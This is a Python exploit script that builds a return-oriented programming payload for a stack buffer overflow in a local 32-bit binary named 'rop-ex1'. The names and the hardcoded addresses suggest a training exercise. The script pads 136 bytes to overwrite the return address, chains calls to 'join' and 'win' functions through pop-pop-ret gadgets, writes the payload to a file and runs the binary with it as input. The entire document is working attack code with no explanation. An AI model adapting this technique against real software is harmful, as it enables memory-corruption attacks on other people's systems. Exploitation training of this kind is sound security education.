import struct
import os

buff_eip = 136
win = 0x804848f
join = 0x804846b

str1 = 0x804a024
str2 = 0x804a044
str3 = 0x804a050

pop_pop_ret = 0x0804856a
exit = 0xb7e327f0

atk_vector = "A"*buff_eip
atk_vector += struct.pack("I", join)
atk_vector += struct.pack("I", pop_pop_ret)
atk_vector += struct.pack("I", str3)
atk_vector += struct.pack("I", str1)

atk_vector += struct.pack("I", join)
atk_vector += struct.pack("I", pop_pop_ret)
atk_vector += struct.pack("I", str3)
atk_vector += struct.pack("I", str2)

atk_vector += struct.pack("I", win)
atk_vector += struct.pack("I", exit)
atk_vector += '\n'

f = open("badfile", 'w+')
f.write(atk_vector)
f.close()

os.system("./rop-ex1 < {}".format('badfile'))





